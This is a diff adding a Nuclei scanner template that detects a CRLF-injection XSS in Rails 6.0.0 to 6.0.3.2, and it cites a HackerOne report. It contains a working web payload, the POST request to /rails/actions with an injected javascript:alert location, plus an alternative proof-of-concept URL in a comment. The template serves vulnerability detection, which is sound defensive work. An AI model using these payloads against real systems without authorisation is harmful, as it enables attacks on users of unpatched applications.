@@ -1,0 +1,36 @@
+id: rails6-xss
+
+#  XSS (6.0.0 < rails < 6.0.3.2); Payload is location=%0djavascript:alert(1);
+#  Nuclei has issues with 302 response missing a Location header thus the
+#  extended payload to make Nuclei work.
+#  Working poc by @Mad-robot
+# /rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0Djavascript%3Aalert%28document.domain%29
+
+info:
+  name: Rails CRLF XSS (6.0.0 < rails < 6.0.3.2)
+  author: ooooooo_q,rootxharsh,iamnoooob
+  severity: medium
+  reference:
+    - https://hackerone.com/reports/904059
+  tags: rails,xss,crlf
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'javascript:alert(1)'
+        part: body
+      - type: status
+        status:
+          - 302
+      - type: word
+        words:
+          - 'Location: aaaaa'
+          - 'text/html'
+        part: header
+        condition: and
